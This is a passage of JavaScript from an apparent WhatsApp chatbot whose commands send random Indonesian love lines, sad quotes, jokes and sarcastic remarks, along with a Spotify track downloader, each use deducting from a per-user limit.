const gombal = ["Ku tuliskan namamu di langit, angin meniupnya. Ku tuliskan namamu di laut, badai membawanya. Ku tuliskan namamu di hatiku, cinta namanya.", "Kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.", "Hari Minggu itu weekend tapi kalau cinta kita will never end.", "Angkutan kota jauh dekat 2 ribu, kalau kamu jauh dekat ya di hatiku.", "Aku tidak peduli ramalan BMKG, sebab saat hujan, badai bahkan tsunami aku akan tetap bertahan pada cintamu.", "Ada 3 hal di dunia ini yang tidak bisa kuhitung, jumlah bintang di langit, ikan di laut dan cintaku padamu.", "Sekarang aku gendutan gak sih? Kamu tau gak kenapa? Soalnya kamu udah mengembangkan cinta yang banyak di hatiku.", "Aku ingin kita seperti sandal jepit sebab hanya ada dua, tidak ada yang namanya orang ketiga.", "Kalau hitungan satu sampai sepuluh, cintaku cukup nomor dua, yaitu dualem banget.", "Katanya kalau sering hujan itu bisa bikin seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.", "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.", "Aku rela menjadi lilin dalam hati kamu, dan kamu yang jagain lilinnya.", "Cita-citaku dulu pengen jadi dokter tapi setelah mengenalmu, berubah jadi ingin membahagiakanmu.", "Nek buku jendela ilmu, sliramu jendela atiku.", "Kalau hitungan satu sampai sepuluh, cintaku cukup nomor dua, yaitu dualem banget.", "Cintaku padamu seperti utang. Awalnya kecil, didiemin, tau-tau gede sendiri.", "Aku rela dipenjara seumur hidup, asalkan pelanggarannya karena mencintaimu.", "Ketika kau mencintainya dan kau hanya mendapat hujan, cintailah aku sebagai pelangimu.", "Cowok boleh nggak sih minum jamu sari rapet, soalnya aku mau rapetin hati aku ke hati kamu.", "Jika kamu tanya berapa kali kamu datang ke pikiranku, jujur saja, cuma sekali. Habisnya, nggak pergi-pergi sih!", "Aku hanya ingin hidup cukup. Cukup lihat senyummu setiap hari."]
const gombalan = gombal[Math.floor(Math.random() * gombal.length)]
alifatah.sendMessage(m.chat, {text: `${gombalan}` }, {quoted:fcall})
}
break

case 'quotessad': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const modesad = ['When lu udah berusaha ngelupain dia yang gabakal mungkin lu miliki, dan sial nya malah ketemu di dalam mimpi','Jika tidak bisa bersatu denganmu setidaknya dunia pernah menjadi saksi bahwa aku benar benar mencintaimu','Seharusnya dri dlu jngn berharap lebih kpd seseorang','Lebih baik tersakiti,daripada harus menyakiti','Hidup bukan sebuah perlombaan, nikmati aja setiap proses nya','Kita punya harapan tapi semesta punya kenyataan','Ternyata maksain komunikasi sama seseorang yang ga ada perasaan lebih sama kita itu nguras energi banget ya,','Dipaksa baik baik saja diatas bumi yang sudah tidak baik baik saja','Terkadang otak kita sudah beradaptasi tanpa kehadiran dia tapi hati sangat sulit untuk kehilangan dia','Malam yg tenang tapi tidak dengan pikiran','Ngentod knp dunia ga berpihak sama gw','Kubaca kembali chat lama kita kemudian aku tersenyum dan akhirnya aku menangis','Sudah kubilang payung hanya bisa dipakai untuk dua orang. Jika ada yang ketiga, maka salah satunya harus siap di guyur hujan beserta badainya. Tapi ini bukan tentang','Mau balik lagi? Maaf hubungan ini tidak bisa berlanjut lagi hehe','Feling lonley cape?,ya istirahat karna tuhan tau yang baik gak bikin kamu lonley','Cape sama dunia nt terus mungkin Tuhan sudah menyiapkan jalan terbaik buat kamu']
const modesada = modesad[Math.floor(Math.random() * modesad.length)]
alifatah.sendMessage(m.chat, {text: `${modesada}` }, {quoted:fcall})
}
break

case 'spotify':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
  if (!text) return reply(`*Example*: ${prefix + command} Hujam Kemarin`);
  const { data, status } = await searching(text);
  if (status === false) return reply("eror");
  const { title, track, artis, durasi, image, download } = await spotifydl(
    data[0].url,
  );
    
  let captionvid = `*SPOTIFY DOWNLOAD*\n\n┌ ◦ *Title*: ${title}\n│ ◦ *Artist*: ${artis}\n└ ◦ *Duration*: ${durasi}\n\n${namabot}`;
  const p = await new canvafy.Spotify()
    .setTitle(title)
    .setAuthor("Spotify Downloader")
    .setTimestamp(40, 100)
    .setOverlayOpacity(0.8)
    .setBorder("#fff", 0.8)
    .setImage(image)
    .setBlur(3)
    .build();

  let a = await alifatah.sendFile(m.chat, p, "", captionvid, fake);
  alifatah.sendMessage(
    m.chat,
    { audio: { url: download }, mimetype: "audio/mpeg", ptt: false },
    { quoted: a },
  );
};
break

case 'quotesbacot':
case 'qbacod': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const pew = ['Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.', 'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.', 'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.', 'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.', 'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.', 'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.', 'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.', 'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.', 'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.', 'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.', 'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.', 'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.', 'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.', 'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.', 'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.', 'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.', 'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.', 'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.', 'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.', 'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!', 'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.', 'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.', 'Statusnya rohani, kelakuannya rohalus.', 'Kegagalan bukan suatu keberhasilan.', 'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.', 'Aku juga pernah kaya, waktu gajian.', 'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.', 'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.', 'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.', 'Jangan terlalu berharap! nanti jatuhnya sakit!', 'Ingat! Anda itu jomblo', 'Gak tau mau ngetik apa']
const gyat = pew[Math.floor(Math.random() * pew.length)]
alifatah.sendMessage(m.chat, {text: `${gyat}` }, {quoted:fcall})
}
break

case 'bucin':
case 'quotesbucin':
case 'qbucin': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const lolo = ["Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
	"Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
	"Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
	"Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
	"Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
	"Pacar orang adalah jodoh kita yang tertunda.",
	"Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
	"Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
	"Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
	"Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
	"Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
	"Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
	"Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
	"Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
	"Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
	"Aku ingin menjadi satu-satunya, bukan salah satunya.",
	"Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
	"Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
	"Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
	"Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
	"Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
	"Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
	"Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
	"Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
	"Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
	"Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
	"Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
	"Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
	"Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
	"Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
	"Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
	"Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
	"Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
	"Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
	"Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
	"Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
	"Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
	"Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
	"PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
	"Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
	"Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
	"Makan apapun aku suka asal sama kamu, termasuk makan ati.",
	"Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
	"Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
	"Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
	"Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
	"Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
	"Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
	"Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
	"Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
	"Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
	"Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
	"Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
	"Denganmu, jatuh cinta adalah patah hati paling sengaja.",
	"Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
	"Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
	"Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
	"Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
	"Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
	"Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
	"Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
	"Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
	"Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
	"Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
	"Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
	"Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
	"Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
	"Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
	"Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
	"Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
	"Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
	"Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
	"Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
	"Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
	"Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
	"Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
	"Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
	"Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
	"Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
	"Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
	"Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
	"Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
	"Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
	"Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
	"Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
	"Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
	"Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
	"Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
	"keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
	"Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
	"Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
	"Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
	"Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
	"Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
	"Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
	"Saben dino kegowo ngimpi tapi ora biso nduweni.",
	"Ora ketemu koe 30 dino rasane koyo sewulan.",
	"Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
	"Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
	"Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
	"Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
	"Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
	"Kanyaah akang moal luntur najan make Bayclean.",
	"Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
	"Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
	"Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
	"Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
	"Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
	"Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
	"Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
	"Cukup jaringan aja yang hilang, kamu jangan.",
	"Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
	"Musuhku adalah mereka yang ingin memilikimu juga.",
	"Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
	"Jam tidurku hancur dirusak rindu.",
	"Cukup China aja yang jauh, cinta kita jangan.",
	"Yang penting itu kebahagiaan kamu, aku sih gak penting..",
	"Cuma satu keinginanku, dicintai olehmu..",
	"Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
	"Cukup antartika aja yang jauh. Antarkita jangan."]
const gyot = lolo[Math.floor(Math.random() * lolo.length)]
alifatah.sendMessage(m.chat, {text: `${gyot}` }, {quoted:fcall})
}
break

case 'sindiran':
case 'qsindiran':
case 'quotessindiran': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const lili = ["Perbedaan teman dan musuh sangat tipis. Ada saatnya dia mendukung berbagai hal yang kamu lakukan, tapi bisa saja dia menusuk dari belakang, bahkan menghancurkanmu.",
  "Dasar gak tahu berterima kasih! Makanya hidupnya bisa menderita seperti itu.",
  "Awas aja, apa yang dia lakukan sekarang bakal berbuah karma di kemudian hari.",
  "Kalau sudah berbicara tentang perasaan, sahabat pun berisiko jadi pelaku tikung menikung.",
  "Bahkan kayu yang berada di sungai selama puluhan tahun pun tak akan berubah menjadi buaya.",
  "Kata 'teman' adalah label yang bisa dicoba siapa saja. Dan kaulah yang menentukan siapa yang paling pantas memakainya.",
  "Sekali-kali bolehlah menjadi orang yang jahat karena menjadi orang baik terus malah dimanfaatin sama teman sendiri.",
  "Terus aja ngomong, aku nguap kalau aku tertarik.",
  "Ada tujuh miliar orang di dunia ini. Kenapa kamu biarkan salah satu dari mereka menghancurkan hidupmu?.",
  "Oh, menderita? Makanya, jangan bikin susah orang.",
  "Hati-hati dengan mereka yang tak pernah sesuai antara ucapan dan tindakan.",
  "Silahkan ngomongin gue sepuasnya, gue hanya senyum saja karena gue tahu karena akan ada yang membalas.",
  "Tak seorang pun mempercayai pembohong. Sekalipun dia menceritakan kebenaran.",
  "Teman datang dan pergi, tapi aku tidak menyangka kamu juga.",
  "Oh, salahku. Maaf sudah mengganggumu. Aku lupa aku hanya ada ketika kamu membutuhkan sesuatu dariku.",
  "Bodoh kok dipiara, kambing tuh dipiara biar gemuk.",
  "Kamu terdengar lebih merdu ketika mulutmu tertutup.",
  "Daripada kamu mau makan teman, jangan lupa tambahkan nasi biar makin kenyang.",
  "Kamu tuh lucu banget, udah tau salah kok malah ngotot.",
  "Omonganmu seperti parfum isi ulang, wangi tapi palsu.",
  "Pasti kamu capek karena harus pakai make up di dua wajah sekaligus.",
  "Konon jika jodoh adalah tulang rusuk, maka mantan sudah menjadi fosil alias tulang belulang.",
  "Bekerjalah seperti tuyul, ia tidak kelihatan, tidak butuh pujian, tidak gila jabatan, dan tidak pula cari perhatian, tapi hasilnya JELAS.",
  "Kamu kok seperti tahi cicak, neng, mukanya putih tapi lehernya hitam.",
  "Kata orang cinta itu buta, tapi nyatanya cinta bisa melihat mana yang tampan dan mana yang buruk rupa.",
  "Berjuangnya sama aku, giliran sudah berhasil kamu berpaling.",
  "Aku tidak kehilanganmu, kamu yang kehilanganku. Kau akan mencari sosokku pada setiap pacar yang kau kencani, tapi kau tidak akan menemukanku.",
  "Kamu mengingatkanku pada receh gopean. Bermuka dua dan nggak terlalu berharga.",
  "Kalau berbohong dan berselingkuh adalah sebuah pekerjaan, kamu pasti sudah menjadi jutawan.",
  "Buanglah mantan pada orang yang lebih membutuhkan.",
  "Perasaan terbaik adalah melihatmu sekarang bersama dengan seseorang yang wajahnya seperti baru saja ditendang pakai kaleng biskuit.",
  "Maaf aku alergi dengan yang namanya balikan sama mantan.",
  "Aku tidak akan pernah sedih kehilangan dirimu, justru bahagia karena tahu siapa kamu sebenarnya.",
  "Apa benar mantan itu singkatan dari manis, tapi setan?",
  "Baru putus aja udah punya pacar baru lagi, kok kamu tuh kaya rumah petak yang murah, sih.",
  "Jika ada seorang teman mengatakan kamu 'PINTAR', jangan sombong. Belum tentu teman tersebut mengatakan yang sebenarnya.",
  "Contohlah tukang parkir, walaupun punya banyak mobil tapi dia nggak sombong! Karena dia tahu semua itu hanya titipan.",
  "Lihatlah ke atas sebagai motivasi bukan untuk jadi sombong, dan melihat ke bawah agar lebih bersyukur bukan untuk menjadi rendah diri.",
  "Kepala lo lebih besar dari mulut lo, tapi kenapa omong kosong lo lebih besar dari cara berpikir lo?",
  "Orang sombong biasanya suka mengatakan hal berlebihan yang sebenarnya tidak ada padanya.",
  "Bergayalah sesuai dompetmu, wahai anak muda.",
  "Sama-sama berasal dari tanah, sama-sama nginjek tanah dan bakal balik lagi ke tanah. Jadi buat apa sombong?",
  "Orang sombong sebenarnya pengecut karena ia tak berani bergaul dengan orang yang lebih hebat dengan dirinya.",
  "Yang lagi cantik jangan sombong, itu cantik sebentar doang. Tua dikit itu cantik sudah hilang, jadi jangan sombong ya cantik.",
  "Orang sombong itu ibarat orang yang berdiri di atas gunung. Dia melihat orang lain kecil, tapi dia tidak sadar orang lain melihatnya kecil juga.",
  "Katanya move on, tapi ternyata masih sibuk stalking mantan.",
  "Jangan berkata dia hanya temanmu. Bukankah kita dulu juga berawal dari sebuah pertemanan?",
  "Hanya karena aku bersamamu sepanjang waktu, bukan berarti kamu bisa menyia-nyiakan aku.",
  "Sudah punya pacar masih juga cari perhatian orang lain, gak bahagia ya lu?",
  "Jadi siapa yang ada dalam handphonemu? Kalau sedang bersamaku kau selalu sibuk dengan handphonemu, tapi kalau aku jauh darimu pesanku lama kau balas.",
  "Hubungan akan karam jika terlalu banyak penumpang di dalamnya.",
  "Kamu sih cuma mau dimengerti dan dipahami tanpa belajar untuk mengerti dan memahami.",
  "Cie,- yang chatnya kalah penting sama game Mobile Legend.",
  "Ternyata lebih gampang update status daripada kasih kabar.",
  "Di zaman now screenshot lebih dipercaya daripada omongan.",
  "Kebohongan yang diceritakan terlalu sering lama-lama akan terasa seperti kebenaran.",
  "Tak perlu mengkhawatirkan mereka yang membicarakanmu di belakang. Mereka ada di belakangmu karena suatu alasan.",
  "Teman datang seiring banyaknya kebutuhan.",
  "Maaf kalau aku menyakiti perasaanmu saat aku bilang kamu bodoh. Aku kira kamu sudah tahu.",
  "Seorang genius sejati takut terlihat tidak sempurna dan biasanya lebih suka diam daripada mengatakan sesuatu yang tidak berarti.",
  "Sayang, kalau kamu mau bermuka dua, paling tidak buatlah salah satunya terlihat cantik.",
  "Semoga suatu hari nanti hidupmu bakal seindah apa yang kamu pamerkan di Facebook.",
  "Miliki lebih dari yang kau tunjukkan, bicaralah lebih sedikit dari yang kamu tahu.",
  "Aku tak butuh teman yang berubah saat aku berubah dan mengangguk saat aku mengangguk. Bayanganku bisa melakukannya dengan lebih baik.",
  "Dunia itu tidak sempit. Kamu saja yang mainnya kurang jauh.",
  "Menjadi suami yang baik sama seperti menjadi komika. Kamu perlu pengalaman selama 10 tahun sebelum dapat menyebut dirimu seorang pemula.",
  "Perempuan itu lebih suka perhatian kecil tapi berkali-kali, daripada perhatian besar tapi cuma sesekali.",
  "Jadilah suami yang baik, yang nggak hobi merayu wanita lain di dunia maya, yang memang banyak yang lebih cantik.",
  "Lebih baik di awal cuek, tapi akhirnya perhatian daripada awalnya perhatian tapi akhirnya cuek.",
  "Betapa indahnya kalau kita saling menghargai dan mengerti. Jangan saling egois dan nggak peduli.",
  "Yang egois kamu, yang selalu disalahkan aku. Yang temperamental kamu, yang selalu sabar aku.",
  "Di balik kesibukanmu, ada yang rela meluangkan waktunya untuk sekadar menunggumu.",
  "Aku tidak mengerti dengan cara berpikirmu. Diamnya istri itu bukan berarti membiarkanmu berbuat sesuka hati dan menyakitiku.",
  "Kalau sayang pasti nggak cuek. Kalau cuek pasti nggak sayang.",
  "Hidup harus bersosialisasi jangan egois. Kalau mau egois mending hidup di hutan.",
  "Mulut dijaga jangan kalah sama pantat deh. Pantat aja kalau mau kentut mikir dulu, ada yang dengerin apa nggak. Masa mulut mau ngomong nggak mikir dulu.",
  "Katanya sih kalau ada orang yang hobinya nyari-nyari kesalahan orang lain, tapi giliran dikritik langsung marah, itu artinya proses evolusi dia dari monyet ke manusia belum selesai dan tidak sempurna.",
  "Aku kangen denganmu, kamu yang dulu, yang baru jelek.",
  "Penampilan yang cantik adalah saat kita merasa nyaman dengan diri sendiri. Saat kita tidak iri dengan orang lain kita akan lebih cantik.",
  "Tidak selalu harus bersama, tapi selalu paham kapan seharusnya ada. Itulah sahabat sebenarnya.",
  "Saya menyukai teman yang memiliki pikiran terbuka karena mereka cenderung membiarkanmu untuk melihat segala masalah dari berbagai sudut pandang.",
  "Lebih baik musuh yang jujur daripada teman palsu.",
  "Kamu harus mengenali teman-teman yang palsu karena itu yang tersulit untuk disadari.",
  "Jangan pernah percaya kepada siapa pun yang menginginkan apa yang kamu dapatkan. Teman atau bukan, iri hati merupakan emosi yang luar biasa.",
  "Kata-kata itu mudah dibuat, seperti angin. Sahabat yang setia sulit untuk ditemukan.",
  "Akan lebih mudah untuk memaafkan orang biasa daripada memaafkan luka yang diberikan dari orang tercinta.",
  "Di balik sakitnya pengkhianatan yang Ku rasa, ku ucapkan terima kasih Padamu. Karena pengkhianatanmu membuat aku tidak lagi berkawan dengan kemunafikan.",
  "Rasa sakit itu mengajariku tentang kedewasaan, berhati-hati, dan menjadi untuk lebih baik lagi.",
  "Terima kasih sudah meninggalkanmu saat aku sendirian. Aku baru sadar kalau aku bisa melakukan semuanya dengan lebih baik tanpamu.",
  "Aku pernah tertikam oleh ilusiku sendiri. Pengkhianatan oleh hatiku yang sibuk menguntai simpul pertanda cinta.",
  "Aku sudah pernah merasakan kepahitan dalam hidup dan yang paling pahit ialah berharap kepada manusia.",
  "Terkadang kamu harus ikhlas dan membiarkan karma mengambil alih.",
  "alifatahhamdulillah, Tuhan masih sayang kepadaku dengan memperlihatkan siapa dirimu ketika berada di belakangku. Walau hatiku sangat sakit kala itu, tapi aku bersyukur bisa tahu. Bahwa kau adalah orang yang berbahaya.",
  "Pengalaman telah mengajariku mana itu saudara, mana kawan, mana sahabat, mana pengkhianat, mana pecundang, mana yang baik, dan mana yang pura-pura baik.",
  "Perbuatan-perbuatan salah adalah biasa bagi manusia, tetapi perbuatan pura-pura itulah sebenarnya yang menimbulkan permusuhan dan pengkhianatan.",
  "Sudah lama aku ingin pergi darimu, tapi tidak memiliki alasan. Dan sekarang aku ucapkan terima kasih karena pengkhianatan dirimu menciptakan alasan untuk pergi meninggalkan kamu.",
  "Jangan pikir saat kamu dapat menyakitiku, kamu itu terlihat hebat!Ingat, saat itu kamu sudah kehilangan orang yang benar-benar mencintaimu...",
  "Aku berhenti, terima kasih. Semoga akan ada sosok yang mampu mencintaimu sebanyak aku dan menunggumu sesabar caraku. Selamat kehilangan cinta yang paling besar.",
